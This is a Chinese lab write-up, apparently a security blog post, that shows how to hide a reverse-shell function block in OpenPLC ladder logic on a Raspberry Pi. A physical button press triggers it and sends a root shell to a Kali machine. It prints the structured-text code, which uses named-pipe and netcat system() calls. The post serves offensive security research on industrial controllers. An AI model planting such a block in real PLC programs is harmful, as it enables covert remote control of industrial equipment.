> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.anquanke.com](https://www.anquanke.com/post/id/236177)

[![](https://p2.ssl.qhimg.com/t019ec0be67f53f2ec3.jpg)](https://p2.ssl.qhimg.com/t019ec0be67f53f2ec3.jpg)

这次实验的目标是通过梯形图的编程，对外反弹一个 PLC 底层 OS 的 shell 连接外部 Kali 机器（也可以是 VPS 上 Kali），而这次采用外部面包板上按钮来做触发。这次 PLC 仍然采用树莓派上运行 OpenPLC 来制作。

1、建立实验环境
--------

这次已经准备好以下几项设备：

树莓派（硬件 PLC 运行 OpenPLC Runtime），IP：192.168.3.14

Window7 虚拟机（运行 OpenPLC 编辑环境）， IP：192.168.3.3

Kali 攻击机（渗透测试），IP：192.168.3.10

外围电路：面包板，LED 灯，按钮和电线

2、编写一个梯形图和封装一个功能块
-----------------

首先，我们打开 OpenPLC 编辑器，新建一个项目后，添加一个自定义功能块：

[![](https://p2.ssl.qhimg.com/t01b3d2ac2685d9d7cf.png)](https://p2.ssl.qhimg.com/t01b3d2ac2685d9d7cf.png)

输入一个功能块的名字，这里为了明显，名字选择 rsh_exec，同时编程语言选择 ST（结构化语言 “类似于 Pascal”）

[![](https://p1.ssl.qhimg.com/t01fcbdc4e60288347e.png)](https://p1.ssl.qhimg.com/t01fcbdc4e60288347e.png)

定义了功能块的输入和输出，同时写入一段反弹 shell 的 ST 的程序段

[![](https://p5.ssl.qhimg.com/t010a2f5fbc41e1fb4a.png)](https://p5.ssl.qhimg.com/t010a2f5fbc41e1fb4a.png)

在 ST 编辑环境中输入以下这段程序：

IF (exe = TRUE) THEN

{system(“mknod /tmp/pipe p”);}

{system(“/bin/sh 0</tmp/pipe | nc 192.168.3.10 4444 1>/tmp/pipe”);}

done := TRUE;

return;

END_IF;

done := FALSE;

return;

3、在用户逻辑中调用这个功能块：
----------------

[![](https://p3.ssl.qhimg.com/t0167720e89b4077224.png)](https://p3.ssl.qhimg.com/t0167720e89b4077224.png)

测试后，运行树莓派上 OpenPLC 的这段成程序，按下按钮后会反弹一个树莓派 Pi OS 的 shell 给外部 Kali 机器，同时会显示 ID 和 hostname，并且是 root 权限。

[![](https://p4.ssl.qhimg.com/t01381c44e86455c556.png)](https://p4.ssl.qhimg.com/t01381c44e86455c556.png)

注释：不是全部 PLC 都支持这种 OS 层的 shell 反弹，但是可以通过梯形图的组态，制作成基于所有 PLC 的自定义的功能码的 shell 反弹程序，如果有工控用户 shell 反弹防护技术和方法感兴趣可以联系工业安全红队 IRTeam。